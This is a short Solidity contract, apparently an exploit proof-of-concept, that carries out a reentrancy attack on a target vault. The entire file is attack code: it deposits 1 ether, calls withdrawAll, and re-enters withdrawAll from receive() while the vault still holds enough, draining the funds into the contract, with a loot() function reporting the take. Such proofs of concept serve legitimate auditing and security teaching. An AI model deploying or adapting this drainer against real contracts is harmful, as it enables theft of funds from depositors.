// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

interface IVault {
    function deposit() external payable;
    function withdrawAll() external;
}

/// @notice Reentrancy proof-of-concept. Deposits one chunk, then re-enters from
/// receive() for as long as the vault still holds enough to pay another one.
contract Attacker {
    IVault public immutable vault;
    uint256 public constant CHUNK = 1 ether;

    constructor(address target) payable {
        vault = IVault(target);
    }

    function pwn() external {
        vault.deposit{value: CHUNK}();
        vault.withdrawAll();
    }

    receive() external payable {
        if (address(vault).balance >= CHUNK) {
            vault.withdrawAll();
        }
    }

    function loot() external view returns (uint256) {
        return address(this).balance;
    }
}
